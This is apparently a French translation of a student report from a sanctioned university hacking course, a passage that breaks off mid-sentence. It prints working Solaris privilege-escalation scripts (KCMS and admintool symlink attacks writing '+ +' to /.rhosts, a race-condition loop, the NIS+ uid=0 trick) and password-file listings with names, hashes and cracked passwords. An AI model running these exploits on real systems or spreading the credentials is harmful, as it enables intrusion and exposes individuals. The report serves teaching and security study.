d&eacute;partement Sciences Informatiques de l'Universit&eacute; A&amp;M
du Texas. Le cours dont la r&eacute;f&eacute;rence est CPSC - 689
est g&eacute;n&eacute;ralement donn&eacute; durant le semestre d'&eacute;t&eacute;.
Le cours a une orientation pratique.</P>
<P ALIGN=LEFT>La classe a &eacute;t&eacute; divis&eacute;e de telle
fa&ccedil;on qu'il y ait une &eacute;quipe Gold (les gentils) alias
les Administrateurs Syst&egrave;me et quatre &eacute;quipes Black
(les m&eacute;chants) alias les hackers. Chaque &eacute;quipe &eacute;tait
compos&eacute;e de 6 &agrave; 7 membres. Il y avait aussi un comit&eacute;
consultatif ainsi que des arbitres. Le comit&eacute; consultatif se
composait des actuels administrateurs syst&egrave;me du d&eacute;partement
des Sciences Informatiques. Les arbitres &eacute;taient le Dr. Udo W.
Pooch et M. Willis Marti.</P>
<P ALIGN=LEFT>Les &eacute;quipes ont pu s'affronter sur un r&eacute;seau
qui se composait de deux machines gold (gold 1 &eacute;tait le
serveur et nous devions pirater gold 2) ainsi que quatre machines
black (chacune appartenant &agrave; une &eacute;quipe black). Un
routeur Cisco reliait les machines gold aux machines black. Ce r&eacute;seau
&eacute;tait surveill&eacute; par le d&eacute;partement des Sciences
Informatiques par le biais d'une machine nomm&eacute;e Kennel. Chaque
&eacute;quipe devait d'abord se connecter &agrave; Kennel et ensuite
&agrave; sa machine respective ou &agrave; n'importe quelle machine &agrave;
laquelle elle avait acc&egrave;s. Tous les utilisateurs disposaient
d'un compte sur la machine Gold2.</P>
<P ALIGN=LEFT>Tous les Jeudi, chaque &eacute;quipe rencontrait le
comit&eacute; consultatif pendant 20 minutes pour faire un rapport de
ses derniers hacks.</P>
<P ALIGN=LEFT>Nous sommes convaincu que ce cours devrait continuer &agrave;
&ecirc;tre enseign&eacute; par le d&eacute;partement des Sciences
Informatiques. Ce fut une exp&eacute;rience d'apprentissage tr&egrave;s
int&eacute;ressante pour chacun de nous &agrave; l'&eacute;quipe
black2.</P>
<HR>
<OL TYPE=A START=3>
	<LI><P ALIGN=LEFT><A NAME="intro"></A><p class="texttitre"><B>Introduction</B></p></P>
</OL>
<P ALIGN=LEFT>Ce compte rendu rapporte toutes les informations
obtenues durant nos exercices de 'Hacking' en tant qu'&eacute;quipe
'Black 2', une des quatre &eacute;quipe black.</P>
<P ALIGN=LEFT>Ce rapport inclus les techniques de hacking que nous
avons appris, les attaques durant lesquelles nous les avons
utilis&eacute;es, ainsi que des suggestions pour les futures versions
de ce cours.</P>
<P ALIGN=LEFT>Lors du d&eacute;roulement de ce cours, nous avons
trouv&eacute; sur Internet diff&eacute;rents sites d'int&eacute;r&ecirc;t
pour le cours, leur URLs se trouvent dans la section r&eacute;f&eacute;rence
de ce document.</P>
<P ALIGN=LEFT>Nous nous sommes inscrit aux listes de diffusions
suivantes : Best of Security, Bugtraq, Firewalls, et ssh. Elles se
sont r&eacute;v&eacute;l&eacute;es &ecirc;tre d'excellentes sources
d'information. Lire ces listes de diffusion, plus que n'importe quoi
d'autre, nous a fait d&eacute;couvrir les aspects techniques des
probl&egrave;mes de s&eacute;curit&eacute;.</P>
<P ALIGN=LEFT>L'&eacute;quipe Black 2 a travaill&eacute; comme une
unit&eacute;. Nous avons pu faire un usage efficace de nos efforts en
organisant des r&eacute;unions r&eacute;guli&egrave;res tous les
trois &agrave; quatre jours, o&ugrave; nous discutions des strat&eacute;gies
utilis&eacute;es, et o&ugrave; nous d&eacute;cidions des nouvelles
strat&eacute;gies &agrave; mettre en pratique ou &agrave; tester. La
charge de travail fut g&eacute;r&eacute;e et r&eacute;partie en
cons&eacute;quence.</P>
<P ALIGN=LEFT>L'Administration Syst&egrave;me est une rude besogne
mais en m&ecirc;me temps on peut appr&eacute;cier cela, jouer et
apprendre quelles sont les particularit&eacute;s du syst&egrave;me.
La majorit&eacute; des membres avait peu de connaissances ant&eacute;rieures
sur le sujet, et donc, il nous a fallut beaucoup de temps et d'effort
pour explorer le syst&egrave;me.</P>
<P ALIGN=LEFT>Tout dans ce cours a &eacute;t&eacute; une excellente
base d'apprentissage pour les futurs Administrateurs Syst&egrave;me
qui ont pu avoir un aper&ccedil;u de ce que peuvent faire les
m&eacute;chants pour p&eacute;n&eacute;trer dans un syst&egrave;me.
Le c&ocirc;t&eacute; pratique de ce cours apporte beaucoup
d'enthousiasme et nous incite &agrave; pratiquer et apprendre
d'avantage.</P>
<P ALIGN=LEFT>Nous esp&eacute;rons que le lecteur appr&eacute;ciera
ce compte rendu.</P>
<HR>
<OL TYPE=A START=4>
	<LI><P ALIGN=LEFT><A NAME="d"></A><p class="texttitre"><B>Techniques
	de Hacking</B></p></P>
</OL>
<P ALIGN=LEFT>Cette section d&eacute;crit les techniques et les
outils auxquels nous avons eu recours pour nos attaques de hacking.
C'est une description purement technique des techniques d'attaques
que nous avons utilis&eacute;es. Les r&eacute;sultats tout comme les
descriptions de ces techniques peut &ecirc;tre trouv&eacute;es dans
la section E.</P>
<OL>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="d1"></A><B>Social Engineering
	(eavsdropping)</B></P>
</OL>
<P ALIGN=LEFT>Notre &eacute;quipe
s'introduisit dans la machine black3 au cours de la seconde journ&eacute;e.
On les avait entendu dire que &laquo;&nbsp;tout &eacute;tait
chimique&nbsp;&raquo; et nous avons devin&eacute; que cela avait
rapport aux mots de passe. Cette supposition fut v&eacute;rifi&eacute;e
en testant des noms d'acides ou d'&eacute;l&eacute;ments chimiques.
Le mot de passe du compte saa2397 se r&eacute;v&eacute;la &ecirc;tre
&laquo;&nbsp;xenon&nbsp;&raquo;. Plus tard, en r&eacute;utilisant la
m&ecirc;me technique, le compte 'btrn2654' r&eacute;v&eacute;la avoir
le mot de passe &laquo;&nbsp;nitrogen&nbsp;&raquo;.</P>
<P ALIGN=LEFT><I>shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown
<BR>halt:*:7:0:halt:/sbin:/sbin/halt
<BR>mail:*:8:12:mail:/var/spool/mail:
<BR>news:*:9:13:news:/usr/lib/news:
<BR>uucp:*:10:14:uucp:/var/spool/uucppublic:
<BR>operator:*:11:0:operator:/root:/bin/bash
<BR>games:*:12:100:games:/usr/games: <BR>man:*:13:15:man:/usr/man:
<BR>postmaster:*:14:12:postmaster:/var/spool/mail:/bin/bash
<BR>nobody:*:-1:100:nobody:/dev/null:
<BR>ftp:*:404:1::/home/ftp:/bin/bash
<BR>guest:*:405:100:guest:/dev/null:/dev/null
<BR>rbatni:LOzfCLHLF1vVU:501:100:<BR>Rajeev
Batni:/home/rbatni:/bin/tcsh <BR>btm2564:CkQzy81AOaGQw:503:100:Bobby
<BR>Makwana:/home/btm2564:/bin/tcsh
<BR>saa2397:G8v5GkekgAEiI:504:100:Syed Aziz:/home/saa2397:/bin/tcsh
<BR>nabrol:nbFO6upHft6uk:505:100:Abrol Nischal:/home/nabrol:/bin/tcsh
<BR>skumar:40MdQaBdrauEk:506:100:Sankaran
Kumar:/home/skumar:/bin/tcsh <BR>smani:wlqnOakMahsaQ:507:100:Somnath
Mani:/home/smani:/bin/tcsh <BR>ellenm:CaJPA2nLQQIbc:508:100:Ellen
Mitchell:/home/ellenm:/bin/tcsh <BR>lars:AbK/NfSsMCuzk:509:100:Lars
Crotwell:/home/lars:/bin/tcsh</I></P>
<OL START=2>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="d2"></A><B>Les vieux Bugs qui sont en
	grande partie patch&eacute;s</B></P>
</OL>
<P ALIGN=LEFT>A la fin des quelques
premiers jours, l'&eacute;quipe gold n'avait toujours pas install&eacute;
un bon syst&egrave;me de surveillance. Malheureusement, nos
connaissances en hacking &eacute;taient encore tr&egrave;s r&eacute;duites
et la plupart des nombreux hacks faciles disponibles sur le net
avaient &eacute;t&eacute; patch&eacute; depuis longtemps sur le
syst&egrave;me Solaris. Nous recherchions sur Internet des petits
hacks que nous avons ensuite essay&eacute;. En parall&egrave;le nous
scannions le syst&egrave;me &agrave; l'aide de COPS (se r&eacute;f&eacute;rer
&agrave; la section F).</P>
<P ALIGN=LEFT>Les r&eacute;sultats de ces
hacks &eacute;taient d&eacute;cevants, mais cela nous a remis sur le
droit chemin dans notre qu&ecirc;te de &laquo;&nbsp;l'acc&egrave;s
root&nbsp;&raquo;. L'un des documents les plus int&eacute;ressant
&eacute;tait &laquo;&nbsp;Improving the Security of Your Site by
Breaking Into It&nbsp;&raquo;, &eacute;crit par Dan Farmer et Wietse
Venema, les programmeurs de Satan.</P>
<P ALIGN=LEFT>La premi&egrave;re m&eacute;thode
qu'ils d&eacute;crivaient aurait pu &ecirc;tre suffisante pour
pirater le syst&egrave;me :</P>
<P ALIGN=LEFT>&laquo;&nbsp;evil%
showmount -e victim.com&nbsp;&raquo;. La faille mount avait d&eacute;j&agrave;
&eacute;t&eacute; d&eacute;couverte par edaniel, un membre de notre
&eacute;quipe (r&eacute;f&eacute;rez vous &agrave; la section D.3).</P>
<P ALIGN=LEFT>Gold2 fut ensuite scannn&eacute;
&agrave; la recherche de failles ftp. Celles ci incluaient : le
r&eacute;pertoire home de ftp en &eacute;criture pour tout le monde,
ce qui faisait qu'un fichier &laquo;&nbsp;.forward&nbsp;&raquo;
contenant &laquo;&nbsp;|/bin/command&nbsp;&raquo; pouvait &ecirc;tre
ex&eacute;cut&eacute; si l'utilisateur ftp recevait un mail ;
l'&eacute;criture dans le r&eacute;pertoire bin de ftp pour ajouter
des commandes &agrave; celles qui pouvaient &ecirc;tre ex&eacute;cut&eacute;es
par les utilisateurs de ftp. Le vieux bug ftp est repr&eacute;sentatif
des hacks simples que nous avons essay&eacute; :</P>
<P ALIGN=LEFT>% ftp -n <BR>ftp&gt; open
victim.com <BR>Connected to victim.com <BR>220 victim.com FTP server
ready. <BR>ftp&gt; quote user ftp <BR>331 Guest login ok, send ident
as password. <BR>ftp&gt; quote cwd ~root <BR>530 Please login with
USER and PASS. <BR>ftp&gt; quote pass ftp <BR>230 Guest login ok,
access restrictions apply. <BR>ftp&gt; ls -al / (ou n'importe
quoi)<BR>Et l'utilisateur obtenait un acc&egrave;s root.</P>
<P ALIGN=LEFT>Le service sendmail sur le
port 25 a ensuite &eacute;t&eacute; scann&eacute; sans plus de
succ&egrave;s. Les vieux bugs Sendmail sont simples &agrave; trouver
sur Internet.</P>
<P ALIGN=LEFT>Des conditions de
concurrence (race condition) ont ensuite &eacute;t&eacute; test&eacute;es
sur le syst&egrave;me. Le principe est d'essayer de lancer deux
programmes en concurrence sur un m&ecirc;me objet, dans l'espoir que
l'interf&eacute;rence entre les deux programmes produira l'effet
d&eacute;sir&eacute;. Prenons pour exemple la commande mkdir : elle
cr&eacute;e d'abord le r&eacute;pertoire, puis ensuite fixe
l'utilisateur qui a appel&eacute; la commande comme &eacute;tant le
propri&eacute;taire du r&eacute;pertoire. Si le r&eacute;pertoire
ainsi cr&eacute;e peut &ecirc;tre remplac&eacute; par un lien vers
/etc/passwd avant que le propri&eacute;taire ne soit fix&eacute;,
alors, nous nous retrouverons propri&eacute;taire de /etc/passwd. Le
petit script suivant tente d'exploiter ce type de faille particuli&egrave;re
(notez que cela n'a pas fonctionn&eacute; sur la machine gold2 qui
fonctionne sous Solaris) :</P>
<P ALIGN=LEFT>#!/bin/csh <BR>while (1)
<BR>/usr/bin/nice -10 &quot;mkdir a;rm -fr a&quot;&amp; <BR>(rm -fr
a; ln -s /etc/passwd a) &amp; <BR>end</P>
<P ALIGN=LEFT>Plusieurs autres &laquo;&nbsp;Race
Conditions&nbsp;&raquo; furent test&eacute;es, l'exploit &laquo;&nbsp;password
race&nbsp;&raquo; fut l'un d'eux (le fichier passwdrace.c se trouve
dans notre r&eacute;pertoire /pub/689ans/black2). Le r&eacute;sultat
fut aussi n&eacute;gatif.</P>
<OL START=3>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="d3"></A><B>Mauvaise configuration de la
	table de montage (mount table)</B></P>
</OL>
<P ALIGN=LEFT>Un &laquo;&nbsp;showmount
-e black1&nbsp;&raquo; nous informais que le r&eacute;pertoire
/export/home de black1 &eacute;tait export&eacute; avec les
permissions pour tout le monde. Ce fut facile de monter
black1:/export/home &agrave; partir de black5, puis de faire un su &agrave;
l'id appropri&eacute; afin de lire/&eacute;crire n'importe quel
fichier qui n'appartenait pas &agrave; root.</P>
<P ALIGN=LEFT>Plus des informations plus
d&eacute;taill&eacute;es, regardez la section R&eacute;sultats pour
notre exploitation de cette erreur de configuration.</P>
<OL START=4>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="d4"></A><B>CERT advisory CA-96.10</B></P>
</OL>
<P ALIGN=LEFT>Les annonces du CERT
concernant Solaris ont &eacute;t&eacute; lu afin d'exploiter les
failles de gold2.</P>
<P ALIGN=LEFT>D'apr&egrave;s l'annonce
CA-96.10 du CERT, il peut arriver que des utilisateurs aient la
permission de modifier leurs propres entr&eacute;es dans
passwd.org_dir, de cette mani&egrave;re ils sont capables de fixer
leur propre uid &agrave; z&eacute;ro. Cela est possible lorsque NIS+
est install&eacute; par d&eacute;faut. En lan&ccedil;ant la commande
&laquo;&nbsp;niscat -o passwd.org_dir&nbsp;&raquo; sur gold2, nous
obtenons :</P>
<P ALIGN=LEFT><I>Object Name : passwd
<BR>Owner : myhost.mydomain.org. <BR>Group : admin.mydomain.org.
<BR>Domain : org_dir.mydomain.org. <BR>Access Rights :
----rmcdrmcd---- <BR>Time to Live : 12:0:0 <BR>Object Type : TABLE
<BR>Table Type : passwd_tbl <BR>Number of Columns : 8 <BR>Character
Separator : : <BR>Search Path : <BR>Columns : <BR>[0] Name : name
<BR>Attributes : (SEARCHABLE, TEXTUAL DATA, CASE SENSITIVE) <BR>Access
Rights : r--------------- <BR>[1] Name : passwd <BR>Attributes :
(TEXTUAL DATA) <BR>Access Rights : -----m---------- <BR>[2] Name :
uid <BR>Attributes : (SEARCHABLE, TEXTUAL DATA, CASE SENSITIVE)
<BR>Access Rights : -----m---------- <BR>[3] Name : gid <BR>Attributes
: (TEXTUAL DATA) <BR>Access Rights : r--------------- <BR>[4] Name :
gcos <BR>Attributes : (TEXTUAL DATA) <BR>Access Rights :
r--------------- <BR>[5] Name : home <BR>Attributes : (TEXTUAL DATA)
<BR>Access Rights : r--------------- <BR>[6] Name : shell <BR>Attributes
: (TEXTUAL DATA) <BR>Access Rights : r--------------- <BR>[7] Name :
shadow <BR>Attributes : (TEXTUAL DATA) <BR>Access Rights :
----------------</I></P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Remarquez
que l'utilisateur a la possibilit&eacute; de modifier son propre uid,
la suite est du g&acirc;teau :</P>
<P ALIGN=LEFT><I>gold2%nistbladm -m uid=0
'[name=edaniel]',passwd.org_dir <BR>gold2%nistbladm -m uid=111
'[name=edaniel]',passwd.org_dir</I></P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Les
d&eacute;tails compl&eacute;mentaires sur l'exploitation de cette
ouverture b&eacute;ante se trouvent dans la section E.</P>
<OL START=5>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="d5"></A><B>Cassage des mots de passe</B></P>
</OL>
<P ALIGN=LEFT>Nous avons lanc&eacute;
Crack version 4.1 sur le fichier password de gold2. Le programme est
parvenu &agrave; casser le mot de passe de l'utilisateur &laquo;&nbsp;Karthik&nbsp;&raquo;,
qui &eacute;tait &laquo;&nbsp;major3&nbsp;&raquo;. Le dictionnaire
utilis&eacute; &eacute;tait tout simplement celui fournit avec le
programme. Un ftp rapide sur le compte de Karthil nous a permit de
confirmer que le mot de passe &eacute;tait correct. Malheureusement,
ce mot de passe &eacute;tait trop faible. Il a &eacute;t&eacute;
cass&eacute; par plusieurs autres groupes. L'activit&eacute;
inhabituelle qui transitait par l'interm&eacute;diaire de ce compte
mena l'&eacute;quipe gold &agrave; bloquer deux de nos utilisateurs
(raoulg et ralphg).</P>
<P ALIGN=LEFT>Plus tard, deux listes de mots furent ajout&eacute;es
au dictionnaire, il y avait : hindu-names (plusieurs des utilisateurs
sont indiens) et usenet-names. Nous avons aussi essay&eacute; des
dictionnaires Espagnol et Chinois. La p&egrave;che n'a
malheureusement pas &eacute;t&eacute; bonne.</P>
<P ALIGN=LEFT>C'est amusant de remarquer que tout au long du jeu, la
liste des mots de passe crypt&eacute;s &eacute;tait disponible par
NIS (juste en tapant : niscat passwd.org_dir). On s'est demand&eacute;
quelle &eacute;tait l'utilit&eacute; de masquer (shadowing) le
fichier /etc/passwd. Voici le fichier de mots de passe sur lequel
nous avons lan&ccedil;&eacute; Crack :</P>
<P ALIGN=LEFT><I>arsc:DXMQYbH2KzYp6:1000:10:/home/larsc:/bin/csh:9666
<BR>karthik:moyfq3ENRQezQ:100:10:/home/karthik:/bin/csh:9662
<BR>jxue:SvAx3W9rovbVM:101:10:/home/jxue:/bin/csh:9660
<BR>junhua:WwUciWBfpmSO6:102:10:/home/junhua:/bin/csh:9660
<BR>xqzhi:72qS/2NubFLxQ:103:10:/home/xqzhi:/bin/csh:9676
<BR>asg7946:CysHGGKxcQa.U:104:10:/home/asg7946:/bin/csh:9660
<BR>krisjay:MnjUgb6XCwMGk:105:10:/home/krisjay:/bin/csh:9676
<BR>ritat:az/xz3QX7vB0.:106:10:/home/ritat:/bin/csh:9669
<BR>uday3988:9.6wqfx.PIcrE:107:10:/home/uday3988:/bin/csh:9660
<BR>dunnc:h/a8z.EFdsO/k:200:10:/home/dunnc:/bin/csh:9660
<BR>csudhir:Oiwuuznd6m5W6:201:10:/home/csudhir:/bin/tcsh:9676
<BR>michaelm:H1fs0qlQqP9sE:202:10:/home/michaelm:/bin/csh:9672
<BR>mmehta:gCg9E0TUUrKos:203:10:/home/mmehta:/bin/csh:9667
<BR>nshanti:*LK*:204:10:/home/nshanti:/bin/csh:9669
<BR>anb5324:*LK*:205:10:/home/anb5324:/pub/gnu/bin/bash:9671
<BR>jredd:Fxrzoi5LHTcn2:206:10:/home/jredd:/usr/bin/tcsh:9669
<BR>ajayg:0oXFd4W2aCxoI:108:10:/home/ajayg:/bin/csh:9670
<BR>raulg:BrJTmwEOT43Do:109:10:/home/raulg:/bin/csh:9667
<BR>edaniel:BpF7Ra.Bnp0Eg:110:10:/home/edaniel:/bin/csh:9667
<BR>ralphg:M/mwmzAgNuxlw:111:10:/home/ralphg:/bin/csh:9678
<BR>faisalk:phAYs/sEs56EA:113:10:/home/faisalk:/bin/csh:9677
<BR>rehan:lnqIdVQGgbuSA:112:10:/home/rehan:/bin/csh:9661
<BR>rbatni:iSuIfppxyWxFo:114:10:/home/rbatni:/bin/csh:9661
<BR>dpatel:YtHSZZwniGUNo:115:10:/home/dpatel:/bin/csh:9664
<BR>btm2564:YdYxvBpq7w6xg:116:10:/home/btm2564:/bin/csh:9667
<BR>saa2397:6I3Fx7StUMJC2:117:10:/home/saa2397:/bin/csh:9661
<BR>nabrol:qB2.0yi8Lhvpw:118:10:/home/nabrol:/bin/csh:9667
<BR>skumar:w5mDRHclwQ1F.:119:10:/home/skumar:/bin/csh:9666
<BR>smani:fdfZezcSs02f6:120:10:/home/smani:/bin/csh:9665
<BR>mpriddy:83Wl8LOmNhG2U:121:10:/home/mpriddy:/bin/csh:9660
<BR>luwenhu:QRGWF6QIN1GMs:122:10:/home/luwenhu:/bin/csh:9664
<BR>brandonb:ieePjIZZ4u1q.:123:10:/home/brandonb:/bin/csh:9662
<BR>johnnyh:TSRNKedxhn8hc:124:10:/home/johnnyh:/bin/csh:9662
<BR>asahoo:kI2bFDW8FaHz6:125:10:/home/asahoo:/bin/csh:9664
<BR>a0s8815:pki7QIsqdR3fE:126:10:/home/a0s8815:/bin/csh:9667
<BR>sajidm:ORfh7.2GXutjY:127:10:/home/sajidm:/bin/csh:9664
<BR>wayne:40k6yZ8e9HejE:128:10:/home/wayne:/bin/csh:9665
<BR>ellenm:9..A27Z0yzCFc:129:10:/home/ellenm:/bin/csh:9669
<BR>willis:p/XzJIRuuVVOk:300:10:/home/willis:/bin/csh:9668
<BR>pooch:ZIYG8DG.l54BQ:400:10:/home/pooch:/bin/csh:9668
<BR>hacker:ue/8aTMAB.LoQ:500:10:/home/hacker:/bin/csh:9676
<BR>sanjay:T52oYfekc7aco:130:10:/home/sanjay:/bin/tcsh:9668</I></P>
<OL START=6>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="d6"></A><B>Le syndrome r&eacute;curent
	des fichiers temporaires, les exploits Kcms/Admintool</B></P>
</OL>
<OL>
	<LI><P ALIGN=LEFT><A NAME="d61"></A><b>Description</b></P>
</OL>
<P ALIGN=LEFT>De type de faille &agrave; toujours donn&eacute;
mauvaise r&eacute;putation au syst&egrave;me d'exploitation UNIX.
Cela correspond &agrave; la cr&eacute;ation d'un fichier temporaire
par un programme fonctionnant en tant que root. Il est possible
d'exploiter cette situation si les permissions sur ce fichier
temporaire sont fix&eacute;es &agrave; rw-rw-rw-, si le fichier
temporaire est cr&eacute;e dans r&eacute;pertoire en &eacute;criture
pour tout le monde, et si le nom du fichier peut &ecirc;tre pr&eacute;dit.
Ensuite, tout ce que le hacker a &agrave; faire c'est cr&eacute;er un
lien symbolique du fichier temporaire qui va &ecirc;tre cr&eacute;e
vers un fichier inexistant. Quand le programme est ensuite ex&eacute;cut&eacute;,
il cr&eacute;e le fichier point&eacute; par le lien symbolique.</P>
<P ALIGN=LEFT>Cette vuln&eacute;rabilit&eacute; a ensuite &eacute;t&eacute;
d&eacute;couverte dans trois programmes qui ont le suid root :
Kcms_calibrate, admintool et vold. Nous l'avons appris sur la liste
de diffusion bugtraq. La vuln&eacute;rabilit&eacute; de vold n'&eacute;tait
pas exploitable dans notre cas car elle n&eacute;cessitait un acc&egrave;s
physique &agrave; la machine. La vuln&eacute;rabilit&eacute;
&laquo;&nbsp;admintool&nbsp;&raquo; fut ensuite corrig&eacute;e par
l'&eacute;quipe gold. La vuln&eacute;rabilit&eacute; de
Kcms_calibrate fut largement utilis&eacute;e, elle n'a jamais &eacute;t&eacute;
corrig&eacute;e par l'&eacute;quipe gold.</P>
<OL START=2>
	<LI><P ALIGN=LEFT><A NAME="d62"></A><b>Vuln&eacute;rabilit&eacute; KCMS</b></P>
</OL>
<P ALIGN=LEFT>Solaris 2.5 offre un
support du Syst&egrave;me de Gestion des Couleurs Kodak (KCMS = Kodak
Color Management System), une suite d'APIs et de librairies
compatibles Openwindows pour cr&eacute;er et g&eacute;rer des profils
qui permettent de contr&ocirc;ler le rendement couleur des &eacute;crans,
des scanners, des imprimantes et des magn&eacute;toscopes (film
recorders).</P>
<P ALIGN=LEFT>KCMS se compose des
programmes kcms_configure et kcms_calibrate qui ont pour r&ocirc;le
de configurer et calibrer un syst&egrave;me X11 window utilisant les
librairies KCMS. Une fois install&eacute;, ces programmes ont les
privil&egrave;ges set-user-id root et set-group-id bin.</P>
<P ALIGN=LEFT>Lorsque l'on le lance,
kcms_calibrate cr&eacute;e le fichier temporaire
/tmp/Kp_kcms_sys.sem, voici un script qui exploite cette
vuln&eacute;rabilit&eacute; en cr&eacute;ant un fichier .rhosts et en
y mettant ++ :</P>
<P ALIGN=LEFT><I>#!/bin/csh <BR>/bin/rm
-rf /tmp/Kp_kcms_sys.sem <BR>cd /tmp <BR>#Making symbolic link <BR>ln
-s /.rhosts Kp_kcms_sys.sem <BR>/usr/openwin/bin/kcms_calibrate &amp;</I></P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Une
fois le script ex&eacute;cut&eacute;, /.rhosts est cr&eacute;e avec
les permissions fix&eacute;es &agrave; 666, alors que le fichier en
lui m&ecirc;me appartient &agrave; root.</P>
<OL START=3>
	<LI><P ALIGN=LEFT><A NAME="d63"></A><b>Vuln&eacute;rabilit&eacute;
	Admintool</b></P>
</OL>
<P ALIGN=LEFT>Admintool est une interface
graphique qui permet &agrave; l'administrateur d'ex&eacute;cuter
diff&eacute;rentes t&acirc;ches d'administration syst&egrave;me sur
le syst&egrave;me. Cela incluse la possibilit&eacute; de g&eacute;rer
les utilisateurs, les groupes, les machines et les services.</P>
<P ALIGN=LEFT>Pour emp&ecirc;cher que
diff&eacute;rents utilisateurs mettent &agrave; jour des fichiers
syst&egrave;me simultan&eacute;ment, admintool utilise plusieurs
fichiers temporaires comme m&eacute;canisme de verrouillage. La
manipulation de ces fichiers temporaires n'est pas faite de mani&egrave;re
s&eacute;curis&eacute;e, si bien qu'il est possible de se servir de
admintool pour cr&eacute;er ou &eacute;crire des fichiers arbitraires
sur le syst&egrave;me.</P>
<P ALIGN=LEFT>Les fichiers sont acc&eacute;d&eacute;s avec l'uid
effectif du processus ex&eacute;cutant admintool.</P>
<P ALIGN=LEFT>Voici un script similaire &agrave; celui fournit pour
l'exploit kcms :</P>
<P ALIGN=LEFT><I>#!/bin/sh <BR>DISPLAY=&quot;:0.0&quot;;export
DISPLAY <BR>rm -rf /tmp/.group.lock <BR>ln -s /.rhosts
/tmp/.group.lock <BR>notbroken=1 <BR>/usr/bin/admintool &amp;
<BR>#(browse -&gt; group -&gt; edit a group -&gt; get an error
message -&gt; exit) <BR>while [ $notbroken -eq 1 ] <BR>do <BR>if [ -f
/.rhosts ]; then <BR>/bin/cp /dev/null /.rhosts <BR>/bin/echo &quot;+
+&quot; &gt;&gt; /.rhosts <BR>/usr/bin/rsh localhost -l root &quot;(
/usr/openwin/bin/xterm -display $DISPLAY&amp; )&quot; <BR>notbroken=0
<BR>sleep 1 <BR>fi <BR>done</I></P>
<OL START=4>
	<LI><P ALIGN=LEFT><A NAME="d64"></A><b>Conclusion</b></P>
</OL>
<P ALIGN=LEFT>Une fois encore le sc&eacute;nario
est le m&ecirc;me. N'importe quel fichier inexistant peut &ecirc;tre
cr&eacute;e en utilisant cette m&eacute;thode.</P>
<P ALIGN=LEFT>Il est donc inutile
d'expliquer le fonctionnement de la vuln&eacute;rabilit&eacute; de
vold dans les d&eacute;tails. La vuln&eacute;rabilit&eacute; KCMS fut
largement exploit&eacute;e pour la seconde intrusion qui est d&eacute;crite
dans la section E.5.</P>
<OL START=7>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="d7"></A>Envoyer de faux paquets et
	scanner les ports UDP, le premier essai de &laquo;&nbsp;d&eacute;ni
	de service&nbsp;&raquo;</P>
</OL>
<P ALIGN=LEFT>On trouve sur Internet
diff&eacute;rents programmes qui ouvrent des sockets SOCK_RAW. Ce
type de socket ne peut &ecirc;tre ouvert seulement si le programme
est ex&eacute;cut&eacute; en tant que root. Une socket de type
SOCK_RAW donne un contr&ocirc;le illimit&eacute; sur les donn&eacute;es
du paquet envoy&eacute;. Nous avons &eacute;t&eacute; capable
d'envoyer des paquets avec une fausse adresse IP de black5 vers
gold2. Nous sommes m&ecirc;me parvenus &agrave; fixer gold1 comme
&eacute;tant l'envoyeur bien que les deux machines soient soit disant
s&eacute;par&eacute;es par un firewall.</P>
<P ALIGN=LEFT>Un de ces programmes est le programme treelight publi&eacute;
dans l'issue #4 de FEH. Il a fallut le modifier pour qu'il fonctionne
sous Solaris car les champs sont nomm&eacute;s diff&eacute;remment
dans le fichier de d&eacute;finition de l'ent&ecirc;te IP. Le
programme envoyait un &laquo;&nbsp;Christmas Tree Packet&nbsp;&raquo;
(SYN, URG, PSH, FIN et 1 octet de donn&eacute;e) de source.port vers
dest.port. Ce type de paquet est aussi connu sous lles noms
&laquo;&nbsp;kamikaze Packet&nbsp;&raquo;, &laquo;&nbsp;Nastygram&nbsp;&raquo;,
et &laquo;&nbsp;lamp test segment&nbsp;&raquo;. Nous y avons eu
recours pour mettre en sc&egrave;ne une attaque &laquo;&nbsp;denial
of service&nbsp;&raquo;. Un paquet ayant (gold2,port7) comme source
et (gold2,port7) comme destination fut envoy&eacute;. Comme le port 7
correspond au port &laquo;&nbsp;echo&nbsp;&raquo;, le paquet fut
&eacute;chang&eacute; ind&eacute;finiment entre gold2 et
lui-m&ecirc;me.Comme aucune autre machine n'&eacute;tait travers&eacute;e,
le nombre de saut (hop count) restait fixe. Bien que le niveau
d'activit&eacute; de gold2 grimpa &agrave; 67%, le syst&egrave;me ne
montra aucun signe de faiblesse.</P>
<OL START=8>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="d8"></A><B>Le protocole ICMP, le
	programme nuke</B></P>
</OL>
<P ALIGN=LEFT>&laquo;&nbsp;Le Protocole
Internet (IP) est utilis&eacute; comme service de datagramme
machine-&agrave;-machine dans un syst&egrave;me de r&eacute;seaux
interconnect&eacute;s nomm&eacute; Catenet. Les machines qui relient
ces r&eacute;seaux sont appel&eacute;es Gateways (passerelles). Ces
passerelles communiquent entre elles dans un but de contr&ocirc;le
par l'interm&eacute;diaire du Gateway to Gateway Protocol (GGP).
Occasionnellement une passerelle ou une machine destination va
communiquer avec une machine source, par exemple, pour rapporter une
erreur dans le traitement d'un datagramme. Dans de telles situations,
on a recours au protocole ICMP (Internet Control Message Protocol).
ICMP utilise IP comme support comme si il &eacute;tait un protocole
de niveau sup&eacute;rieur, cependant, ICMP fait en r&eacute;alit&eacute;
partie int&eacute;grante d'IP, et doit &ecirc;tre impl&eacute;ment&eacute;
dans tous les modules IP&nbsp;&raquo;. (DARPA Internet Protocol
Specification).</P>
<P ALIGN=LEFT>Les messages ICMP peuvent
&ecirc;tre exp&eacute;di&eacute;s dans diff&eacute;rentes situations
: par exemple quand un datagramme ne parvient pas &agrave;
destination, quand la passerelle ne poss&egrave;de plus assez de
m&eacute;moire pour faire suivre un datagramme, et quand la
passerelle peut diriger la machine sur un chemin plus cours pour
acheminer sont trafic. La partie qui nous int&eacute;resse est
l'&eacute;change de paquets ICMP_unreach qui informe une machine que
son destinataire ou le port de son destinataire n'est plus
accessible.</P>
<P ALIGN=LEFT>Pour vous prot&eacute;ger contre les attaques par d&eacute;nie
